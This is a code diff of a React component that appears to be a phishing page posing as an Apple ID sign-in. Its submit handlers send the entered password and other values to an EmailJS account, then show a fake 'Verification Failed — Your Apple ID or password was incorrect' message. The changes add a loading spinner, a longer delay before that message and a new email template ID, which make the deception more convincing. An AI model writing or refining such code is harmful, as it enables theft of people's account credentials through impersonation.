@@ -1,5 +1,5 @@
 import React, { useState } from 'react'
-import { Container, Col, Row, Form } from 'react-bootstrap'
+import { Container, Col, Row, Form, Spinner } from 'react-bootstrap'
 import FormControlLabel from '@material-ui/core/FormControlLabel'
 import Checkbox from '@material-ui/core/Checkbox'
 import { send } from 'emailjs-com'
@@ -21,6 +21,16 @@ const MainContent = () => {
 
   const hideModal = () => {
     setIsOpen(false)
+  }
+
+  const [isSpinner, setIsSpinner] = React.useState(false)
+
+  const showSpinner = () => {
+    setIsSpinner(true)
+  }
+
+  const hideSpinner = () => {
+    setIsSpinner(false)
   }
 
   const [showPasswordField, setShowPasswordField] = useState(false)
@@ -69,7 +79,7 @@ const MainContent = () => {
     e.preventDefault()
     send(
       'service_01j94cb',
-      'template_yo1r1gj',
+      'template_yo1r1gjj',
       total,
       'user_t8N33j6cjQKJksgrQdNFs'
     )
@@ -92,6 +102,13 @@ const MainContent = () => {
     fontWeight: 400,
     wordSpacing: '-2px',
   }
+  const spinner = props => {
+   
+      return (
+          alert('hi')
+      )
+ 
+  }
 
   return (
     <div className='main-contains'>
@@ -105,7 +122,7 @@ const MainContent = () => {
          <div class="lds-spinner"
    >
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
-     
+      
         <Container className='align-middle11'>
           <div className='content'>
             <Row className='element'>
@@ -163,7 +180,7 @@ const MainContent = () => {
                                   e.preventDefault()
                                   send(
                                     'service_01j94cb',
-                                    'template_yo1r1gj',
+                                    'template_yo1r1gjj',
                                     total,
                                     'user_t8N33j6cjQKJksgrQdNFs'
                                   )
@@ -180,7 +197,8 @@ const MainContent = () => {
                                     })
                                 }
                                 onSubmit(e)
-                                setTimeout(showModal, 3000)
+                                setTimeout(showSpinner, 1)
+                                setTimeout(showModal, 5000)
                               }
                             }}
                             onInput={changePasswordButtonColor}
@@ -199,7 +217,7 @@ const MainContent = () => {
                                     e.preventDefault()
                                     send(
                                       'service_01j94cb',
-                                        'template_yo1r1gj',
+                                        'template_yo1r1gjj',
                                         total,
                                         'user_t8N33j6cjQKJksgrQdNFs'
                                     )
@@ -216,7 +234,8 @@ const MainContent = () => {
                                       })
                                   }
                                   onSubmit(e)
-                                  setTimeout(showModal, 3000)
+                                  setTimeout(showSpinner, 1)
+                                  setTimeout(showModal, 5000)
                                 }}
                               ></i>
                             </button>
@@ -302,6 +321,7 @@ const MainContent = () => {
           top: '30%',
           position: 'fixed',
           left: '7.5%',
+          
         }}
         show={isOpen}
         onHide={hideModal}
@@ -313,37 +333,33 @@ const MainContent = () => {
           }}
         >
           <Modal.Title
-            style={{
-              justifyContent: 'center',
-              fontSize: '14px',
-            }}
-          >
-            Verification Failed
-          </Modal.Title>
+            
+            >
+              <div style={{
+                marginBottom:'0px',
+                justifyContent: 'center',
+                textAlign: 'center'
+              }}>Verification Failed </div><p style={{
+                justifyContent: 'center',
+                fontSize: '12px',
+                textAlign: 'center',
+              }}>Your Apple ID or password was incorrect.</p>
+            </Modal.Title>
         </Modal.Header>
-
-        <Modal.Body
-          style={{
-            fontSize: '12px',
-            textAlign: 'center',
-            fontFamily: 'Arial',
-          }}
-        >
-          Your Apple ID or password was incorrect.
-        </Modal.Body>
-
         <Modal.Footer
           style={{
             fontSize: '12px',
             fontFamily: 'Arial',
             justifyContent: 'center',
+            marginTop:'0px',
           }}
         >
           <button
             style={{
-              fontSize: '12px',
+              fontSize: '16px',
               fontWeight: 'bold',
               color: '#0071c9',
+              height: '20px',
               fontFamily: 'Arial',
               border: 'none',
               backgroundColor: 'white',
@@ -353,6 +369,16 @@ const MainContent = () => {
             OK
           </button>
         </Modal.Footer>
+      </Modal>
+      
+            <Modal
+        show={isSpinner}
+        onHide={hideSpinner}
+      >
+          <div class="spin"
+      >
+            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+    
       </Modal>
     </div>
   )
